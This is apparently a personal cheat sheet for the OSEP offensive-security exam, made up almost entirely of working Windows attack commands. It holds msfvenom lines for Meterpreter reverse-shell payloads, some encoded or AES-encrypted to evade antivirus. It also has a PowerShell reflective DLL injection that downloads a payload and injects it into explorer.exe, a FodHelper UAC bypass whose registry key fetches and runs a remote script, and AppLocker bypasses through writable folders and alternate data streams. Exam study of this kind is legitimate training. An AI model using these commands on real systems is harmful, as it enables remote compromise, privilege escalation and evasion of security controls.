# OSEP-Survival Joruney: Complete Guide

## Payload Generation

### Staged
```
#Staged
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f exe -o ./msfstaged.exe

#NonStaged
sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=tun0 LPORT=443 -f exe -o ./msfnonstaged.exe

##VBA Staged
msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication

##DLL Staged
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f dll -o met.dll

##Encoder
sudo msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_encoded.exe


##Encryptor
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe
```

### Non-staged
```
#exe
sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=tun0 LPORT=443 -f exe -o ./msfnonstaged.exe
```

## MSFConsole
```
sudo msfconsole -q
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.45.221
```

## DLL Injection

### Load On-Disk DLL into Memory
```
#Load DLL into bytes
$filePath = "C:\Path\To\YourFile.dll"
$bytes = Get-Content -Path $filePath -Encoding Byte -ReadCount 0
```

### Reflective DLL Injection
```
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.188/met.dll')
$procid = (Get-Process -Name explorer).Id
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

## Privilege Escalation

### FodHelper
```
#In C2
set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru
exploit

#In Victim
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
```


## Application bypass

### Basic Bypass
```
#Check sysinternals with RW
accesschk.exe "student" C:\Windows -wus

#Check NT AUTHORITY\Authenticated Users:(RX)
icacls.exe C:\Windows\Tasks

#Then copy the executable to trustable folder
```

### Alternate data stream
```
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```